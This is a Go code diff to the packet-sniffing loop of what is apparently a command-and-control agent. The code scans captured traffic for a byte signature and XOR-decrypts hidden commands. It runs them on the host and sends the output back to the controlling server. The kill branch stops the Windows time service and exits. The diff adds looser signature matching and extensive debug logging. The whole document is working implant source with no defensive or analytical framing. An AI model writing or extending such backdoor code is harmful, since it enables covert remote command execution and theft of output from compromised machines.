@@ -258,70 +258,118 @@ func startSniffer() {
 	// Buffer to accumulate command chunks
 	var commandBuffer string
 
+	// Process packets
 	for packet := range packetSource.Packets() {
-		// Extract the IP layer to get the source
-		ipLayer := packet.NetworkLayer()
-		if ipLayer == nil {
-			continue
-		}
+		// Get complete raw packet data
+		packetData := packet.Data()
+		log.Printf("DEBUG-PACKET-1: Received packet with %d bytes", len(packetData))
 
-		// Get source IP from the packet
-		//ipLayerContents := ipLayer.LayerContents()
-		//srcIP := net.IP(ipLayerContents[len(ipLayerContents)-8 : len(ipLayerContents)-4])
-
-		// Verify the packet is from our C2 server
-		// {
-		// If different, update our server IP (handles DHCP changes)
-		//agent.ServerIP = srcIP
-		//setup()
-		//}
-
-		// Get application layer data
+		// First, try to extract application layer data if possible
+		var payloadToCheck []byte
 		appLayer := packet.ApplicationLayer()
-		if appLayer == nil {
+		if appLayer != nil {
+			payloadToCheck = appLayer.Payload()
+			log.Printf("DEBUG-PACKET-2: Extracted application layer with %d bytes", len(payloadToCheck))
+		} else {
+			// If there's no application layer, use the entire packet
+			payloadToCheck = packetData
+			log.Printf("DEBUG-PACKET-2: No application layer, using entire packet")
+		}
+
+		// Search for our signature pattern 0x1a, 0x01, 0x0a, 0xf0 anywhere in the packet
+		signaturePattern := []byte{0x1a, 0x01, 0x0a, 0xf0}
+		signatureIndex := bytes.Index(payloadToCheck, signaturePattern)
+
+		if signatureIndex == -1 {
+			log.Printf("DEBUG-PACKET-3: Signature pattern not found in packet")
+			continue // Signature not found, skip this packet
+		}
+
+		log.Printf("DEBUG-PACKET-4: Found signature at offset %d", signatureIndex)
+
+		// Calculate the position of the command type (11 bytes after the start of signature)
+		commandTypeIndex := signatureIndex + 11
+
+		// Make sure there's enough data for the command type
+		if len(payloadToCheck) < commandTypeIndex+4 {
+			log.Printf("DEBUG-PACKET-5: Packet too short for command type")
 			continue
 		}
 
-		// Decode the packet payload
-		payload := appLayer.Payload()
-		if len(payload) < 15 {
-			continue // Not enough data for a valid packet
+		// Extract the command type (4 bytes)
+		commandType := string(payloadToCheck[commandTypeIndex : commandTypeIndex+4])
+		log.Printf("DEBUG-PACKET-6: Command type: '%s'", commandType)
+
+		// Check if we have a valid command type
+		validCommand := false
+		switch commandType {
+		case common.CommandContinued, common.CommandDone, common.CommandKill, common.CommandPing:
+			validCommand = true
 		}
 
-		// Extract the command type and data
-		packetType := string(payload[11:15])
+		if !validCommand {
+			log.Printf("DEBUG-PACKET-7: Unrecognized command type: '%s'", commandType)
+			continue
+		}
 
-		// If there's data beyond the 15-byte mark, decode it
+		// Calculate data index (15 bytes after start of signature)
+		dataIndex := signatureIndex + 15
+
+		// Extract and decrypt data if there's any
 		var data string
-		if len(payload) > 15 {
-			// Decrypt the XOR encoded data using '.' as the key
-			decrypted := common.XORDecrypt(payload[15:], '.')
+		if len(payloadToCheck) > dataIndex {
+			// Get encrypted bytes
+			encryptedBytes := payloadToCheck[dataIndex:]
+			log.Printf("DEBUG-PACKET-8: Encrypted data length: %d bytes", len(encryptedBytes))
+
+			// Decrypt using XOR with '.'
+			decrypted := common.XORDecrypt(encryptedBytes, '.')
+
 			// Trim null bytes
-			data = string(bytes.Trim(decrypted, "\x00"))
+			cleanData := bytes.Trim(decrypted, "\x00")
+			data = string(cleanData)
+
+			log.Printf("DEBUG-PACKET-9: Decrypted command data: '%s'", data)
+		} else {
+			log.Printf("DEBUG-PACKET-10: No command data in packet")
 		}
 
-		// Process based on packet type
-		switch packetType {
+		// Process the command based on its type
+		switch commandType {
 		case common.CommandContinued:
 			// Accumulate command chunks
+			log.Printf("DEBUG-COMMAND-1: Received command chunk: '%s'", data)
 			commandBuffer += data
+
 		case common.CommandDone:
 			// Final chunk received, execute the command
+			log.Printf("DEBUG-COMMAND-2: Received final command chunk: '%s'", data)
 			commandBuffer += data
-			output := runCommand(commandBuffer)
 
-			// Send the command output back
+			log.Printf("DEBUG-COMMAND-3: Executing command: '%s'", commandBuffer)
+			output := runCommand(commandBuffer)
+			log.Printf("DEBUG-COMMAND-4: Command execution complete")
+			log.Printf("DEBUG-COMMAND-5: Command output: '%s'", output)
+
+			// Create the response packet
+			log.Printf("DEBUG-COMMAND-6: Creating response packet")
 			responsePacket := common.NewOutputPacket(agent.ServerIP.String(), output)
+
+			// Send the response
+			log.Printf("DEBUG-COMMAND-7: Sending command output to server")
 			err := responsePacket.ChunkAndSendOutput()
 			if err != nil {
-				log.Printf("Failed to send command output: %v", err)
+				log.Printf("DEBUG-COMMAND-8: Error sending output: %v", err)
+			} else {
+				log.Printf("DEBUG-COMMAND-9: Command output sent successfully")
 			}
 
 			// Clear the buffer
 			commandBuffer = ""
+
 		case common.CommandKill:
 			// Kill the agent
-			log.Println("Received kill command. Shutting down...")
+			log.Printf("DEBUG-COMMAND-10: Received kill command. Shutting down...")
 
 			if agent.OperatingSystem == "Windows" {
 				runCommand("net stop w32time")
@@ -333,12 +381,16 @@ func startSniffer() {
 
 			agent.HeartbeatActive = false
 			os.Exit(0)
+
 		case common.CommandPing:
 			// Send a heartbeat in response
+			log.Printf("DEBUG-COMMAND-11: Received ping command, sending response")
 			packet := common.NewReferencePacket(agent.ServerIP.String(), common.CommandPing)
 			err := packet.SendReferencePacket()
 			if err != nil {
-				log.Printf("Failed to send ping response: %v", err)
+				log.Printf("DEBUG-COMMAND-12: Failed to send ping response: %v", err)
+			} else {
+				log.Printf("DEBUG-COMMAND-13: Ping response sent successfully")
 			}
 		}
 	}
